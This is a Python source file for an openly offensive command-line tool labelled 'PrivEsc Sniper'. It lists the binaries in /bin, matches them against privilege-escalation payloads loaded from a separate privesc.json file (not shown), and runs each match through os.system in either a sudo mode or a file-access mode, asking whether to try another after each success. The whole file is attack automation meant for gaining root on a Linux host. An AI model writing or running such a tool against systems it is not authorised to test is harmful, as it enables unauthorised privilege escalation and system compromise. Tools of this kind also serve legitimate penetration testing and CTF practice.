import subprocess
from colorama import Fore
import os
import json
from main import intro

with open("privesc.json") as f:
    privescs = json.load(f)
def main(file_esc):
    intro(""" \n ██▓███   ██▀███   ██▓ ██▒   █▓▓█████   ██████  ▄████▄       ██████  ███▄    █  ██▓ ██▓███  ▓█████  ██▀███  \n▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▓█   ▀ ▒██    ▒ ▒██▀ ▀█     ▒██    ▒  ██ ▀█   █ ▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒\n▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒███   ░ ▓██▄   ▒▓█    ▄    ░ ▓██▄   ▓██  ▀█ ██▒▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒\n▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒     ▒   ██▒▓██▒  ▐▌██▒░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄  \n▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░  ░▒████▒▒██████▒▒▒ ▓███▀ ░   ▒██████▒▒▒██░   ▓██░░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒\n▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░  ░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░   ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░\n░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░   ░ ░  ░░ ░▒  ░ ░  ░  ▒      ░ ░▒  ░ ░░ ░░   ░ ▒░ ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░\n░░         ░░   ░  ▒ ░     ░░     ░   ░  ░  ░  ░           ░  ░  ░     ░   ░ ░  ▒ ░░░          ░     ░░   ░ \n            ░      ░        ░     ░  ░      ░  ░ ░               ░           ░  ░              ░  ░   ░     \n                           ░                   ░                                                            \n""")
    output = subprocess.run(['ls', '/bin'], stdout=subprocess.PIPE, text=True)
    output = (output).stdout.split('\n')
    if file_esc == True:
        mode = 2
    elif file_esc == False:
        mode = 1
    else:
        mode = int(input("\n1 - check for sudo PrivEsc\n2 - Check for file PrivEsc\n$ "))
    if mode == 1:
        checkPrivEsc(output)
    elif mode == 2:
        checkFileAccess(output)

def ask_another():
    answer = input("do you want to try another? [y/n]> ")
    if answer.lower()[:1] == "y":
        return True
    else:
        return False

def thank():
    print("Thanks for using")
    exit()

def runCmd(cmds):
    for cmd in cmds:
        print(Fore.RED, f"Trying {cmd}", Fore.RESET)
        cmd_status = os.system(cmds[cmd])
        if cmd_status == 0 and not ask_another():
            thank()

def cmdPrint(cmd):
    print(Fore.RED, f"[+] Found {cmd}", Fore.RESET)

def checkPrivEsc(output):
    cmds = {}
    for cmd in output:
        if cmd in privescs["su"]:
            cmdPrint(cmd)
            cmds[cmd] = privescs["su"][cmd]
    runCmd(cmds)

def checkFileAccess(output):
    cmds = {}
    for cmd in output:
        if cmd in privescs["file"]:
            cmdPrint(cmd)
            cmds[cmd] = privescs["file"][cmd]
    print(cmds)
    runCmd(cmds)
